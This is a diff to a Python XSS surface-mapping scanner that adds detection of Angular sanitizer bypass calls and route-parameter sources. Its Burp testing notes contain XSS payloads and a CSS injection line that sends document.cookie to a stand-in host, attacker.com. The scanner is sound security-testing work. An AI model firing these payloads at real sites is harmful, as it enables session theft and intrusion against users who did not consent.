@@ -73,7 +73,14 @@ _DOM_SOURCES = [
     "location.search.substring(",
     "location.search.replace(",
     "params.get(",
-    "qs.parse(",         # common query string lib
+    "qs.parse(",                           # common query string lib
+    # Angular router sources
+    "queryParamMap.get(",
+    "paramMap.get(",
+    "snapshot.queryParams",
+    "snapshot.params",
+    "snapshot.fragment",
+    "activatedRoute.snapshot",
 ]
 
 # ─── REFLECTED XSS PARAMS ────────────────────────────────────────────────────
@@ -117,6 +124,156 @@ _STORED_MEDIUM_FIELDS = {
     "address", "location", "website", "url", "link",
     "label", "tag", "category", "reason", "notes",
 }
+
+# ─── ANGULAR SECURITY BYPASS SINKS ──────────────────────────────────────────
+#
+# Angular's DomSanitizer.bypassSecurityTrust*() family explicitly disables
+# Angular's built-in sanitization for a specific context. Finding these in
+# compiled/minified bundles is HIGH confidence - the dev consciously bypassed
+# the security layer and the only question is whether the input is user-controlled.
+#
+# Each method covers a different injection context with different payloads:
+#
+#   bypassSecurityTrustHtml()     - raw HTML injected into [innerHTML] binding
+#                                   → XSS via <script>, <img onerror>, etc.
+#   bypassSecurityTrustScript()   - raw JS injected into <script> src or content
+#                                   → direct script execution
+#   bypassSecurityTrustUrl()      - raw URL used in href/src attributes
+#                                   → javascript: URI → XSS, or open redirect
+#   bypassSecurityTrustResourceUrl() - raw URL for external resources (script src,
+#                                   iframe src, link href)
+#                                   → CSP bypass, script injection from attacker host
+#   bypassSecurityTrustStyle()    - raw CSS injected into [style] binding
+#                                   → CSS injection, expression() in IE, data exfil
+#   bypassSecurityTrustSanitizer() - bypasses the sanitizer pipe entirely
+#                                   → catch-all, treat as HTML bypass
+#
+# In minified Angular bundles these are mangled (e.g. t.bypassSecurityTrustHtml)
+# but the method name suffix is always preserved by the Angular compiler because
+# it's part of the DomSanitizer public API contract.
+
+_ANGULAR_BYPASS_SINKS = {
+    # method_suffix: (surface_label, risk_description, payload_hint, confidence)
+    "bypassSecurityTrustHtml": (
+        "Angular bypassSecurityTrustHtml",
+        "Disables HTML sanitization - raw HTML injected into [innerHTML] or similar binding. "
+        "Any user-controlled input reaching this → XSS.",
+        "HIGH",
+    ),
+    "bypassSecurityTrustScript": (
+        "Angular bypassSecurityTrustScript",
+        "Disables script sanitization - value used as raw JS content or script src. "
+        "User-controlled input → direct script execution.",
+        "HIGH",
+    ),
+    "bypassSecurityTrustUrl": (
+        "Angular bypassSecurityTrustUrl",
+        "Disables URL sanitization - value used in href/src attributes without validation. "
+        "Enables javascript: URI XSS and open redirect.",
+        "HIGH",
+    ),
+    "bypassSecurityTrustResourceUrl": (
+        "Angular bypassSecurityTrustResourceUrl",
+        "Disables resource URL sanitization - value used as external resource URL "
+        "(script src, iframe src, link href). Attacker-controlled URL → CSP bypass, "
+        "script injection from attacker-controlled host.",
+        "HIGH",
+    ),
+    "bypassSecurityTrustStyle": (
+        "Angular bypassSecurityTrustStyle",
+        "Disables CSS sanitization - value injected into [style] binding without filtering. "
+        "Enables CSS injection for data exfiltration via url() or expression() in legacy IE.",
+        "MEDIUM",
+    ),
+    "bypassSecurityTrustSanitizer": (
+        "Angular bypassSecurityTrustSanitizer",
+        "Bypasses the Angular sanitizer pipe entirely. Treat as HTML bypass - "
+        "any user-controlled input reaching this is a direct XSS vector.",
+        "HIGH",
+    ),
+}
+
+# Angular sanitization suppressor patterns - these mark a component as
+# explicitly opting out of Angular's built-in HTML sanitization via
+# the SECURITY_SCHEMA or custom sanitization config.
+_ANGULAR_SANITIZER_SUPPRESSOR_PATTERNS = [
+    "SecurityContext.NONE",            # DomSanitizer.sanitize(SecurityContext.NONE, ...)
+    "allowedSanitizedProperties",      # custom schema that widens allowed attrs
+    "CUSTOM_ELEMENTS_SCHEMA",          # disables unknown element/attr warnings, loosens sanitization
+    "NO_ERRORS_SCHEMA",                # disables all schema checking
+]
+
+# Angular template expressions that directly set DOM properties bypassing
+# sanitization in property binding contexts
+_ANGULAR_TEMPLATE_SINK_PATTERNS = [
+    "[innerHTML]",          # already in _STRONG_SINKS but calling out explicitly
+    "[outerHTML]",
+    "[href]",               # property binding on href - differs from attr binding
+    "[src]",                # property binding on src
+    "[action]",             # form action
+    "bind-innerHTML",       # verbose binding syntax
+    "bind-href",
+    "(click)=\"eval",       # event binding calling eval
+]
+
+# Angular-specific DOM sources: ActivatedRoute, Router events, query params
+_ANGULAR_SOURCES = [
+    "activatedRoute.snapshot.queryParams",
+    "activatedRoute.snapshot.params",
+    "activatedRoute.queryParams",
+    "activatedRoute.params",
+    "route.snapshot.queryParams",
+    "route.snapshot.params",
+    "router.parseUrl(",
+    "NavigationExtras",
+    "ActivatedRoute",
+    "queryParamMap.get(",
+    "paramMap.get(",
+    "snapshot.fragment",
+]
+
+_BURP_NOTES_ANGULAR_BYPASS_HTML = (
+    "Angular bypassSecurityTrustHtml detected - Angular's XSS protection explicitly disabled. "
+    "Trace DomSanitizer.bypassSecurityTrustHtml() call back to its input. "
+    "If any part is user-controlled (route param, query param, API response field), it's XSS. "
+    "Payloads: <img src=x onerror=alert(document.domain)>, <svg onload=alert(1)>. "
+    "Search bundle for 'bypassSecurityTrustHtml' and review every call site."
+)
+
+_BURP_NOTES_ANGULAR_BYPASS_SCRIPT = (
+    "Angular bypassSecurityTrustScript detected - script sanitization disabled. "
+    "Any user-controlled value reaching this executes as JavaScript. "
+    "Trace the call site back to route params, API data, or localStorage. "
+    "This is typically HIGH severity if exploitable."
+)
+
+_BURP_NOTES_ANGULAR_BYPASS_URL = (
+    "Angular bypassSecurityTrustUrl detected - href/src URL sanitization disabled. "
+    "Test: inject javascript:alert(document.domain) as a URL value. "
+    "Also test data: URIs. If the value flows from a query param or route segment, "
+    "it's exploitable for XSS via javascript: scheme."
+)
+
+_BURP_NOTES_ANGULAR_BYPASS_RESOURCE_URL = (
+    "Angular bypassSecurityTrustResourceUrl detected - external resource URL sanitization disabled. "
+    "Value is used as script src, iframe src, or link href without validation. "
+    "If user-controlled: host a payload JS file and inject its URL to load arbitrary scripts. "
+    "This bypasses CSP if the policy uses 'unsafe-inline' or if the app trusts attacker domains."
+)
+
+_BURP_NOTES_ANGULAR_BYPASS_STYLE = (
+    "Angular bypassSecurityTrustStyle detected - CSS sanitization disabled. "
+    "Test CSS injection: inject } body{background:url(http://attacker.com/?c=document.cookie)} { "
+    "In legacy IE: expression(alert(1)). "
+    "Even without XSS, CSS injection enables UI redressing and data exfiltration via url()."
+)
+
+_BURP_NOTES_ANGULAR_SANITIZER_SUPPRESSOR = (
+    "Angular sanitization suppressor detected (SecurityContext.NONE or custom schema). "
+    "The app has explicitly disabled or weakened Angular's built-in sanitization. "
+    "Audit [innerHTML] bindings and bypassSecurityTrust* calls in the same component. "
+    "Any user-controlled value flowing into an [innerHTML] binding is XSS."
+)
 
 # ─── POSTMESSAGE PATTERNS ────────────────────────────────────────────────────
 
@@ -220,9 +377,10 @@ def _find_sources(content: str) -> List[str]:
 
 def _is_framework_sink(content: str) -> Dict[str, bool]:
     return {
-        "react":  "dangerouslySetInnerHTML" in content or "__html" in content,
-        "vue":    "v-html" in content,
-        "jquery": any(s in content for s in [".html(", ".append(", ".prepend(", ".after(", ".before("]),
+        "react":   "dangerouslySetInnerHTML" in content or "__html" in content,
+        "vue":     "v-html" in content,
+        "jquery":  any(s in content for s in [".html(", ".append(", ".prepend(", ".after(", ".before("]),
+        "angular": any(k in content for k in _ANGULAR_BYPASS_SINKS),
     }
 
 def _sink_burp_notes(sinks: List[str], frameworks: Dict[str, bool]) -> str:
@@ -230,9 +388,45 @@ def _sink_burp_notes(sinks: List[str], frameworks: Dict[str, bool]) -> str:
         return _BURP_NOTES_REACT
     if frameworks.get("vue"):
         return _BURP_NOTES_VUE
+    if frameworks.get("angular"):
+        return _BURP_NOTES_ANGULAR_BYPASS_HTML
     if frameworks.get("jquery"):
         return _BURP_NOTES_JQUERY
     return _BURP_NOTES_DOM_SURFACE
+
+def _detect_angular_bypass(content: str) -> List[Dict]:
+    """
+    Scan JS content for Angular bypassSecurityTrust* calls.
+    Returns a list of dicts with keys: method, label, risk, confidence, burp_notes.
+    Each unique method found in the file is returned once.
+    """
+    found = []
+    burp_map = {
+        "bypassSecurityTrustHtml":        _BURP_NOTES_ANGULAR_BYPASS_HTML,
+        "bypassSecurityTrustScript":      _BURP_NOTES_ANGULAR_BYPASS_SCRIPT,
+        "bypassSecurityTrustUrl":         _BURP_NOTES_ANGULAR_BYPASS_URL,
+        "bypassSecurityTrustResourceUrl": _BURP_NOTES_ANGULAR_BYPASS_RESOURCE_URL,
+        "bypassSecurityTrustStyle":       _BURP_NOTES_ANGULAR_BYPASS_STYLE,
+        "bypassSecurityTrustSanitizer":   _BURP_NOTES_ANGULAR_BYPASS_HTML,
+    }
+    for method, (label, risk, conf) in _ANGULAR_BYPASS_SINKS.items():
+        if method in content:
+            found.append({
+                "method":     method,
+                "label":      label,
+                "risk":       risk,
+                "confidence": conf,
+                "burp_notes": burp_map[method],
+            })
+    return found
+
+def _detect_angular_sources(content: str) -> List[str]:
+    """Return Angular-specific user-controlled sources found in content."""
+    return [s for s in _ANGULAR_SOURCES if s in content]
+
+def _detect_angular_sanitizer_suppressor(content: str) -> List[str]:
+    """Return any sanitization suppressor patterns found in content."""
+    return [p for p in _ANGULAR_SANITIZER_SUPPRESSOR_PATTERNS if p in content]
 
 def _has_postmessage_listener(content: str) -> bool:
     return any(p in content for p in _POSTMESSAGE_LISTENER_PATTERNS)
@@ -436,6 +630,78 @@ class XssMapper(BaseSurfaceMapper):
                     confidence   = pm_confidence,
                     evidence     = pm_evidence,
                     burp_notes   = _BURP_NOTES_POSTMESSAGE,
+                )
+
+            # ── Angular bypassSecurityTrust* detection ────────────────────────
+            # Each method found gets its own finding because they represent
+            # different injection contexts with different payloads and severity.
+            angular_bypasses = _detect_angular_bypass(content)
+            angular_sources  = _detect_angular_sources(content)
+            suppressors      = _detect_angular_sanitizer_suppressor(content)
+
+            for bypass in angular_bypasses:
+                conf_str = bypass["confidence"]
+                conf     = (ConfidenceLevel.HIGH   if conf_str == "HIGH"
+                            else ConfidenceLevel.MEDIUM)
+
+                ang_evidence = [
+                    f"Angular security bypass: {bypass['method']}() found in {js.url or ep_url}",
+                    bypass["risk"],
+                ]
+
+                # Presence of Angular-specific sources (route params, queryParamMap)
+                # in the same file is strong evidence of user-controlled input flowing in
+                if angular_sources:
+                    ang_evidence.append(
+                        f"Angular user-controlled sources in same file: "
+                        f"{', '.join(angular_sources[:3])}"
+                    )
+                    # Source + bypass in same file = very high confidence
+                    conf = ConfidenceLevel.HIGH
+
+                # Generic DOM sources also count
+                if sources:
+                    ang_evidence.append(
+                        f"Additional DOM sources: {', '.join(sources[:2])}"
+                    )
+                    conf = ConfidenceLevel.HIGH
+
+                if suppressors:
+                    ang_evidence.append(
+                        f"Sanitization suppressor also present: {', '.join(suppressors)} "
+                        f"- Angular's schema-level protection also weakened"
+                    )
+
+                self._candidate(
+                    endpoint     = synthetic_ep,
+                    surface_type = bypass["label"],
+                    parameters   = [],
+                    confidence   = conf,
+                    evidence     = ang_evidence,
+                    burp_notes   = bypass["burp_notes"],
+                )
+
+            # Sanitization suppressor without a bypass call - still worth flagging
+            # because any [innerHTML] binding in the same component loses protection
+            if suppressors and not angular_bypasses:
+                supp_evidence = [
+                    f"Angular sanitization suppressor detected in {js.url or ep_url}: "
+                    f"{', '.join(suppressors)}",
+                    "Angular's built-in sanitization weakened at schema level - "
+                    "review all [innerHTML] bindings in this component for user-controlled input",
+                ]
+                if "[innerHTML]" in content or "[outerHTML]" in content:
+                    supp_evidence.append(
+                        "Property binding to [innerHTML] or [outerHTML] found in same file - "
+                        "sanitization bypass is active at the point of HTML rendering"
+                    )
+                self._candidate(
+                    endpoint     = synthetic_ep,
+                    surface_type = "Angular Sanitization Suppressor",
+                    parameters   = [],
+                    confidence   = ConfidenceLevel.MEDIUM,
+                    evidence     = supp_evidence,
+                    burp_notes   = _BURP_NOTES_ANGULAR_SANITIZER_SUPPRESSOR,
                 )
 
             # Skip sink/source analysis if no sinks present
